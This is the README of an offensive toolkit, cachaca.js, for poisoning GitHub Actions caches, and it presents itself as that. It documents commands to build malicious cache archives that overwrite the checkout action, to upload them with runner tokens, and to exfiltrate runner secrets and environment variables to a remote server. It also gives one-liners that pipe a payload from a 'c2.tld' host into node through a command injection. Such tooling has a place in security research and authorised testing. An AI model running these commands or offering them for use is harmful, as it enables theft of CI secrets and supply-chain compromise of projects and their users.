<div align="center">
	:cocktail:
</div>
<h1 align="center">
  cachaca.js
</h1>

<p align="center">
   Some JS files to exploit GitHub action cache poisoning.
</p>

<div align="center">
  <!--<img src="img/cachaca.png"/>-->
</div>

<br />

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Installation](#installation)
- [GitHub action cache poisoning](#github-action-cache-poisoning)
- [Usage](#usage)
  - [cachaca-cli.js](#cachaca-clijs)
    - [Upload](#upload)
    - [Archive](#archive)
    - [list](#list)
    - [delete](#delete)
    - [exfil](#exfil)
  - [cachaca-dumper.js](#cachaca-dumperjs)
  - [cachaca-poisoner.js](#cachaca-poisonerjs)
- [Acknowledgements](#acknowledgements)


## Installation

```
$ git clone https://github.com/Hug0Vincent/cachaca.js.git
$ cd cachaca.js
$ npm i
```

To build all the scripts:
```
$ npm run build
```

## GitHub action cache poisoning

> when a workflow checked out and ran user-controlled code, but only had a ``GITHUB_TOKEN`` with read access and no secrets [...] There is a way to escalate by smashing caches.

This attack vector was originaly found by [@adnanthekhan](https://twitter.com/adnanthekhan), you can read it [here](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/) and [here](https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/).

This project includes JS scripts designed to exploit GitHub Actions's cache mechanism. To use them, you must be able to execute arbitrary commands within a workflow running on the default branch.

## Usage

### cachaca-cli.js

```
$ node dist/cachaca-cli.js
Usage: cachaca.js [options] [command]

CLI tool for exploiting GitHub action's cache.

Options:
  -V, --version      output the version number
  -h, --help         display help for command

Commands:
  upload [options]   Upload a cache entry to GitHub.
  archive [options]  Build a cache archive.
  list [options]     List all cache entries for a repository
  delete [options]   Delete a specific cache entry
  exfil [options]    Send secrets to a remote server.
  help [command]     display help for command

```

#### Upload

The upload command can be used to upload a ``zstd`` archive to GitHub. It should be run from a runner:

```
$ node dist/cachaca-cli.js upload -k cache_key -v node_modules -u https://127.0.0.1/mycache.zstd
```

> [!NOTE] 
> You can specify the version as a path (or multiple paths separated by commas). If you do, the tool will automatically resolve the actual version for you.

```
Usage: cachaca.js upload [options]

Upload a cache entry to GitHub.

Options:
  -k, --key <key>          Cache key
  -v, --version <version>  Cache version
  -f, --file <path>        Path to the local artifact file
  -u, --url <url>          URL of the remote artifact file
  -t, --token <token>      GitHub token
  -h, --help               display help for command
```

> [!NOTE] 
> You can execute it independently of a runner by supplying a cached JWT. However, you won’t be able to upload an archive if the workflow that provided the JWT has already terminated.

#### Archive

This command can be used to build malicious ``zstd`` archives:

```
$ node dist/cachaca-cli.js archive -z mycache.zstd -a ./assets/action_checkout.yml -r /home/runner/work/_actions/actions/checkout/v4/action.yml
$ node dist/cachaca-cli.js archive -z mycache.zstd -a ./dist/cachaca-dumper.js -r /home/runner/work/_actions/actions/checkout/v4/dist/cachaca-dumper.js
📦 building archive: mycache.zstd
✅ Archive updated.
📄 Archive entries:
	- /home/runner/work/_actions/actions/checkout/v4/action.yml
	- /home/runner/work/_actions/actions/checkout/v4/dist/cachaca-dumper.js

```

```
Usage: cachaca.js archive [options]

Build a cache archive.

Options:
  -z, --zstd <path>          Path for the archive file
  -a, --add <path>           Source file or directory to archive
  -r, --rename <name>        Rename file in archive.
  -l, --leading-path <path>  Leading path in the archive (default: "")
  --list                     List archive content.
  -h, --help                 display help for command

```

#### list

This command is used to list cache entries from a repo:

```
$ node dist/cachaca-cli.js  list -o actions -r runner                                                                                     26.15% 2/9GB 
Cache entries:
- Key: Linux-nuget-86355ad7f28c3580457d8ef5b7f66a402201c7c7abb60add09b887f3512d907e, Version: 8c75eb08de5d59433e0e9b6619bc4f318fdc1c66a7b9ee1589973a6c37f2b874, Ref: refs/heads/main, Size: 1737918364 bytes
- Key: Linux-nuget-d6dfc31d4d2f6ebf6a2ed39484c617033ba83fe3a0919004cd7fd1219228cf2d, Version: 8c75eb08de5d59433e0e9b6619bc4f318fdc1c66a7b9ee1589973a6c37f2b874, Ref: refs/heads/dependabot/nuget/src/Sdk/main/Azure.Storage.Blobs-12.25.1, Size: 2610626989 bytes
```

#### delete

This command is used to remove a cache entry from a repo.

```
$ node dist/cachaca-cli.js  delete -o org -r repo -t $GHP -k cache_key -v cache_version
```

> [!IMPORTANT]  
> You need to provide a token with the ``actions: write`` permission.

#### exfil

This command extracts the GitHub secrets passed to the runner, along with the current environment variables, and sends them as a JSON payload via a POST request to a remote server. It must be executed within a runner.

```
$ node dist/cachaca-cli.js exfil -u https://127.0.0.1
```

### cachaca-dumper.js

Single script that perform the same operation as the ``exfil`` command. The URL is embedded at build time. It can be used from a command injection inside a runner:

```
$ curl -k https://c2.tld/cachaca-dumper.js | node
```

To configure it edit the ``dumperExfilUrl`` value in [config.json](config.json).

### cachaca-poisoner.js

Single script that perform the same operation as the ``upload`` command. The arguments are embedded at build time. It can be used from a command injection inside a runner:

```
$ curl -k https://c2.tld/cachaca-poisoner.js | node
```

To configure it edit the values in [config.json](config.json).

``poisonerFetchMode`` can be ``url`` / ``file`` / ``embedded``. In any case ``poisonerFetchModeValue`` will contain the associated value wich would be an URL or a file path. In the ``embedded`` case the file will be staticaly added to ``cachaca-poisoner.js``.

``poisonerCacheVersion`` must contain the full version or the value of the ``path`` in the ``restore`` action:

```yml
-   name: cache
    uses: actions/cache/restore@v4
    with:
        path: node_modules/
        key: npm-test
```

Here is a config example:

```json
{
    "dumperExfilUrl":"https://127.0.0.1/",
    "poisonerFetchMode":"url",
    "poisonerFetchModeValue":"http://127.0.0.1/custom_cache.zstd",
    "poisonerCacheKey": "npm-test",
    "poisonerCacheVersion": "node_modules/"
}
```

## Acknowledgements

- [@adnanthekhan](https://twitter.com/adnanthekhan) for the original research and also because portions of this project include code from [Cacheract](https://github.com/AdnaneKhan/Cacheract).
